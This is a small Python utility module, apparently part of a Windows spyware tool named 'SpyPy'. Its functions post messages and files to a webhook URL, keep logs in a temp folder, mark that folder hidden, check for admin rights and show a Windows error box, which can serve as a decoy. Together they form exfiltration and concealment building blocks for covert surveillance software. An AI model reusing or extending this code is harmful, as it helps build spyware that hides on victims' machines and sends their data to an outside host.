import os
import ctypes
import sys
import requests
import tempfile

def is_admin():
    return ctypes.windll.shell32.IsUserAnAdmin()


def send_webhook(url, message=None, file=None):
    data = {"username": "SpyPy"}
    if message:
        data["content"] = message
    if file:
        data["file"] = file
    requests.post(url, json=data)


def is_exe():
    return getattr(sys, "frozen", False)

def get_logs_path(software_dir_name):
    return os.path.join(tempfile.gettempdir(), software_dir_name)

def display_error_message(title, message):
    ctypes.windll.user32.MessageBoxW(0, message, title, 0x10)


def hide_dir(path):
    ctypes.windll.kernel32.SetFileAttributesW(path, 2)
